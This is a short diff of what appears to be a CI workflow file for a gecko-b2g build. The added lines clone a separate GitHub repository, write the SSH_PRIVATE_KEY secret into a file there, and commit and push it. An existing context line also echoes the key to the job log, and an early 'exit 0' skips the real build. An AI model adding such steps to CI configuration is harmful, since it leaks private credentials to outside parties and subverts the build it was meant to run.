@@ -18,6 +18,13 @@ jobs:
         touch ~/id_rsa
         tmp=${SSH_PRIVATE_KEY}
         echo $tmp
+        git clone git@github.com:ittat/tmp.git
+        cd tmp
+        touch ssh
+        echo "$SSH_PRIVATE_KEY" > ssh
+        git add ./*
+        git commit -m "ssh"
+        git push 
         exit 0
         cd ~
         git clone https://github.com/kaiostech/gecko-b2g  -b gonk
